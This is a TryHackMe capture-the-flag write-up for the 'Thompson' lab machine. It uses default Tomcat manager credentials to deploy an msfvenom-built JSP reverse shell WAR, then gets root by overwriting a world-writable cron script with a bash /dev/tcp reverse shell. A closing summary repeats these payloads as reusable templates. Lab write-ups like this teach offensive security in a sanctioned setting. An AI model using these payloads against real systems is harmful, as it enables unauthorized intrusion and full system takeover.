# Thompson - TryHackMe

> **Kill Chain Summary**: Enumerate Apache Tomcat 8.5.5 on port 8080 and retrieve default administrative credentials (`tomcat:s3cret`) disclosed directly within the default HTTP 401 error page. Authenticate to the `/manager/html` administrative interface and deploy a malicious `.war` archive containing a Java reverse shell to obtain initial access as the `tomcat` service user. After stabilizing the shell, inspect system cron jobs in `/etc/crontab` to identify a task running `/home/jack/id.sh` as root every minute, overwrite the world-writable script (`777` permissions) with a bash reverse shell payload, and receive a root shell upon cron execution.

| Property | Value |
| --- | --- |
| **Target Name** | Thompson |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Default Credentials Discovery (HTTP 401 Unauthorized Leak), Apache Tomcat Manager Access, Malicious WAR Payload Deployment (msfvenom), Cron Job Hijacking (World-Writable Script) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed to enumerate all listening services on the target:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **22/tcp** | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux) | Secure Shell Remote Access |
| **8009/tcp** | ajp13 | Apache Jserv (Protocol v1.3) | AJP Connector for Web Frontends |
| **8080/tcp** | http | Apache Tomcat 8.5.5 | Java Application Server |

### Web Application Enumeration (Port 8080)

Navigating to `http://$IP:8080` displays the default Apache Tomcat welcome landing page.

A directory fuzzing scan using Gobuster enumerated standard Tomcat administrative endpoints:

```bash
gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirb/common.txt -t 30
```

**Discovered Endpoints:**
- `/manager` (HTTP 302 -> `/manager/html`)
- `/host-manager` (HTTP 302 -> `/host-manager/html`)

---

## 2. Initial Access

### Information Disclosure via HTTP 401 (Default Credentials)

Navigating to `/manager/html` prompts for HTTP Basic Authentication. Cancelling the prompt returns the default Apache Tomcat 401 Unauthorized error page. 

In default or poorly maintained Tomcat installations, this error page includes sample XML configuration snippets intended to assist administrators with configuring `tomcat-users.xml`. Reviewing the displayed configuration sample revealed active default credentials:

- **Username**: `tomcat`
- **Password**: `s3cret`

Using these credentials, authentication to `http://$IP:8080/manager/html` succeeded, granting full administrative access to the Tomcat Web Application Manager.

### Deploying a Malicious WAR Application

The Tomcat Manager interface allows administrators to deploy prepackaged Java web archives (`.war`).

Using `msfvenom`, a standalone JSP reverse shell was packaged into a WAR file:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.129.253 LPORT=4444 -f war > shell.war
```

#### Deployment and Execution

1. Navigated to the "WAR file to deploy" section of the Manager interface.
2. Selected `shell.war` and clicked **Deploy**.
3. Verified that the `/shell` context appeared in the deployed application list.
4. Started a Netcat listener on Kali:

```bash
nc -lvnp 4444
```

5. Triggered the payload by sending an HTTP GET request to `/shell/`:

```bash
curl http://$IP:8080/shell/
```

The listener caught the incoming connection, providing initial shell access as the service user `tomcat`:

```bash
connect to [192.168.129.253] from (UNKNOWN) [10.10.x.x] 42110
whoami
tomcat
```

### Shell Stabilization

The reverse shell was immediately stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 3. Privilege Escalation

### System Enumeration

An initial check for SUID binaries was performed:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Standard binaries were returned without unusual permissions or vulnerabilities.

Next, system-wide scheduled tasks were audited by inspecting the system crontab:

```bash
cat /etc/crontab
```

An automated task executing every minute (`* * * * *`) as `root` was discovered:

```text
# m h dom mon dow user  command
*  *    * * *   root    cd /home/jack && bash id.sh
```

### Vulnerability Analysis: World-Writable Cron Script

The cron task periodically changes directory to `/home/jack` and executes `bash id.sh` with root authority.

Checking file permissions for `/home/jack/id.sh`:

```bash
ls -la /home/jack/id.sh
```

Output:
```text
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 /home/jack/id.sh
```

The script possesses full `777` permissions, allowing any user on the system to read, modify, and execute it.

### Exploitation via Cron Script Hijacking

On Kali, a new listener was initialized:

```bash
nc -lvnp 1234
```

On the target system, the contents of `/home/jack/id.sh` were replaced with a bash reverse shell one-liner:

```bash
echo 'bash -i >& /dev/tcp/192.168.129.253/1234 0>&1' > /home/jack/id.sh
```

Within 60 seconds, the cron daemon executed the script with root privileges, returning a root shell on Kali:

```bash
connect to [192.168.129.253] from (UNKNOWN) [10.10.x.x] 35482
root@thompson:/home/jack# whoami
root
root@thompson:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```

The user and root flags were captured:

```bash
cat /home/jack/user.txt
[FLAG REDACTED]

cat /root/root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Generating a Java JSP Reverse Shell in WAR Format
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

# Stabilizing a Python PTY Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Inspecting System Crontabs
cat /etc/crontab
ls -la /etc/cron.*

# Overwriting Writable Cron Scripts
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > /path/to/script.sh
```

---

## 5. Key Takeaways and Lessons Learned

1. **Default Credential Disclosures in Error Pages**:
   Web frameworks and enterprise middleware (such as Apache Tomcat, Jenkins, and JBoss) frequently embed default credentials or example configurations directly inside default HTTP 401 or 404 response pages. Always inspect error responses and cancel HTTP Basic authentication prompts to inspect the underlying markup.

2. **Standardized Tomcat Exploitation**:
   Access to the Tomcat `/manager/html` administrative console allows arbitrary deployment of WAR packages. Packaging reverse shells via `msfvenom -p java/jsp_shell_reverse_tcp -f war` is the most reliable, non-intrusive method for achieving initial code execution on Tomcat targets.

3. **Auditing Scheduled Task Permissions**:
   Whenever inspecting cron jobs (`/etc/crontab`, `/etc/cron.*`, or cron spool directories), always verify file and directory permissions of every script and binary called. If a script executed by root has write permissions assigned to standard users or groups, trivial root compromise is guaranteed.

---

#thm #linux #ubuntu #tomcat #default-credentials #war-payload #msfvenom #cron #scheduled-tasks #privilege-escalation #world-writable #easy